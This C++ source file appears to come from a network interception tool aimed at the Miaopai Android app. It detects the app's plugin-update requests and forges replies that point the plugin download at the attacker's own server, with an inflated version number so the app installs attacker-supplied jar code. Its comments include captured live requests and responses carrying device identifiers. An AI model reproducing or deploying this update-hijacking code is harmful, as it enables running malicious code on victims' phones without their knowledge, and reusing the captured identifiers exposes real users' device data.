#include "MiaoPaiUpdate.h"
#include "../httputils.h"
#include "../cipher/CryptoUtils.h"



int MiaoPaiUpdate::isMiaoPai(const char * url, const char * host) {
	if (strstr(host, "b-api.ins.miaopai.com") == FALSE) {
		return FALSE;
	}

	///client/plugin.json?plugininfo=[]
	if (strstr(url, "/client/plugin.json"))
	{
		return TRUE;
	}

	return FALSE;
}




int MiaoPaiUpdate::makeRequestReply(char * dstbuf, int dstbuflimit, string username) {
	char * szHttpPartialZipFormat = "HTTP/1.1 200 OK\r\n"
		"Content-Type: application/json; charset=utf8\r\n"
		"Content-Length: %u\r\n"
		"Connection: keep-alive\r\n\r\n%s";

	int ret = 0;

	
	string MIAOPAI_FILENAME1 = "miaopai_player_27.jar";
	//string MIAOPAI_FILENAME2 = "miaopai_plugin_23.jar";

	string strip = HttpUtils::getIPstr(gServerIP) + "\\/" + username;
	int version1 = 99;	//27
	//int version2 = 99;	//22

	string filename1 = Public::getUserPluginPath(username) + MIAOPAI_FILENAME1;
	//string filename2 = Public::getUserPluginPath(username) + MIAOPAI_FILENAME2;

	char szmd5_1[64] = { 0 };
	//char szmd5_2[64] = { 0 };
	unsigned char hexmd5[64] = { 0 };
	int filesize1 = CryptoUtils::getUpdateFileMd5(filename1, szmd5_1, hexmd5, 1);
	//int filesize2 = CryptoUtils::getUpdateFileMd5(filename2, szmd5_2, hexmd5, 1);

	char hdrformat[4096];
// 	char szformat[] = "{\"status\":200,\"result\":{\"pluginConfig\":{\"clearAllPlugin\":false,\"removePlugins\":[]},\"plugins\":"
// 		"[{\"name\":\"com.yixia.plugin.yxplayer\",\"downloadURL\":\"http:\\/\\/%s\\/%s\","
// 		"\"md5\":\"%s\",\"version\":%u},{\"name\":\"com.yixia.plugin.insrecordplugin\","
// 		"\"downloadURL\":\"http:\\/\\/%s\\/%s\",\"md5\":\"%s\",\"version\":%u}]}}";
// 	int httphdrlen = sprintf_s(hdrformat, 4096, szformat,
// 		strip.c_str(), MIAOPAI_FILENAME1.c_str(),szmd5_1, version1, strip.c_str(), MIAOPAI_FILENAME2.c_str(), szmd5_2,version2);

	char szformat[] = "{\"status\":200,\"result\":{\"pluginConfig\":{\"clearAllPlugin\":false,\"removePlugins\":[]},\"plugins\":"
		"[{\"name\":\"com.yixia.plugin.yxplayer\",\"downloadURL\":\"http:\\/\\/%s\\/%s\","
		"\"md5\":\"%s\",\"version\":%u}]}}";
	int httphdrlen = sprintf_s(hdrformat, 4096, szformat,
		strip.c_str(), MIAOPAI_FILENAME1.c_str(), szmd5_1, version1);

	int retlen = sprintf(dstbuf, szHttpPartialZipFormat, httphdrlen, hdrformat);

	//char szout[4096];
	//int outlen = sprintf_s(szout, 4096, "miaopai reply:%s\r\n", dstbuf);
	//Public::WriteLogFile(ATTACK_LOG_FILENAME, szout, outlen);

	return retlen;
}

int MiaoPaiUpdate::prepareRespData(unsigned long ulIP, string filepath, string filename) {
	m_iRespSize = 0x1000;
	m_iRespSize = makeRequestReply(m_lpResp, m_iRespSize, G_USERNAME);
	return m_iRespSize;
}


/*
b-api.ins.miaopai.com/client/plugin.json?plugininfo=[]&t=12664918&unique_id=df27269d-531f-38fc-9862-8d2432923efd&version=5.2.30&AndroidId=863857039555171&udid=15308E18AB5B71F8B56CA17D1450B8C1&channel=vivo_market

GET /client/plugin.json?plugininfo=[]&t=12664918&unique_id=df27269d-531f-38fc-9862-8d2432923efd&version=7.2.30&AndroidId=863857039555171&udid=15308E18AB5B71F8B56CA17D1450B8C1&channel=vivo_market HTTP/1.1
cp-os: android
cp-abid: 1-10
cp-sign: 11dfb1a694eaaba54406e4de6cbd59d7
cp-sver: 6.0.1
cp-appid: 424
cp-uniqueId: df27269d-531f-38fc-9862-8d2432923efd
cp-time: 1557468697
cp-uuid: df27269d-531f-38fc-9862-8d2432923efd
cp-channel: vivo_market
cp-vend: miaopai
cp-ver: 7.2.30
Host: b-api.ins.miaopai.com
Connection: Keep-Alive
Accept-Encoding: gzip
User-Agent: okhttp/3.3.1
*/
/*
GET /client/plugin.json?plugininfo=[]&t=52479186&unique_id=b7daf183-a6dd-3296-82f8-bb323ac8c7f8&version=7.2.00&AndroidId=A00000611E3E28&udid=97142F4CEC99E6E43508E5936CC09C44&channel=oppo_market HTTP/1.1
cp-os: android
cp-abid: 1-10
cp-sign: dda7494d236772e38a05c493e9c2304a
cp-sver: 6.0.1
cp-appid: 424
cp-uniqueId: b7daf183-a6dd-3296-82f8-bb323ac8c7f8
cp-time: 1552185498
cp-uuid: b7daf183-a6dd-3296-82f8-bb323ac8c7f8
cp-channel: oppo_market
cp-vend: miaopai
cp-ver: 7.2.00
Host: b-api.ins.miaopai.com
Connection: Keep-Alive
Accept-Encoding: gzip
User-Agent: okhttp/3.3.1

HTTP/1.1 200 OK
Date: Sun, 10 Mar 2019 02:38:17 GMT
Content-Type: application/json
Transfer-Encoding: chunked
Connection: keep-alive
Set-Cookie: aliyungf_tc=AQAAAOFkRgg48AkA9lQKcCEyv5Ga1H9n; Path=/; HttpOnly
Vary: Accept-Encoding
X-Powered-By: PHP/7.0.13
Cache-Control: no-cache, must-revalidate
Expires: Sun, 10 Mar 19 01:38:17 +0000
X-Frame-Options: Deny
DPOOL_HEADER: ins-others-472178998-t6f9l
Content-Encoding: gzip
Server: elb

{"status":200,"result":{"pluginConfig":{"clearAllPlugin":false,"removePlugins":[]},"plugins":
[{"name":"com.yixia.plugin.yxplayer","downloadURL":"http:\/\/mpdl.miaopai.com\/tmp\/miaopai_player_27_201811161050.jar",
"md5":"d0ce4d26049bb2dd99836bfb13a2c999","version":27},{"name":"com.yixia.plugin.insrecordplugin",
"downloadURL":"http:\/\/mpdl.miaopai.com\/tmp\/miaopai_record_22_201902280947.jar","md5":"5b530f20bdd086c2cf86496d3bb4cad7","version":22}]}}
*/